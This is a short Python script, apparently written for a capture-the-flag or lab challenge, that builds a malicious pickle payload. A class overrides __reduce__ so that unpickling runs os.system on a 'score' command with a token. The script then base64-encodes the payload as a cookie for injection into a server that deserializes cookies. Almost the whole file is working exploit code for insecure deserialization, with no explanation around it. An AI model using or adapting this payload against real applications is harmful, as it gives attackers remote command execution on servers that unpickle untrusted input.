import pickle
import pickletools
import os
import base64


class Hack:
    def __init__(self):
        self.test1 = "test"
        self.test2 = "retest"


class CustomHack:
    def __reduce__(self):
        return (os.system, ("/usr/local/bin/score 2997a060-7bc8-4240-bdda-40da012936dc",))




h = CustomHack()

serialized = pickle.dumps(h,2)
cookie = base64.b64encode(serialized).decode("utf-8")
print(cookie)
# deserialized = pickle.loads(serialized)

# print(deserialized.__dict__)
# print(pickletools.dis(serialized))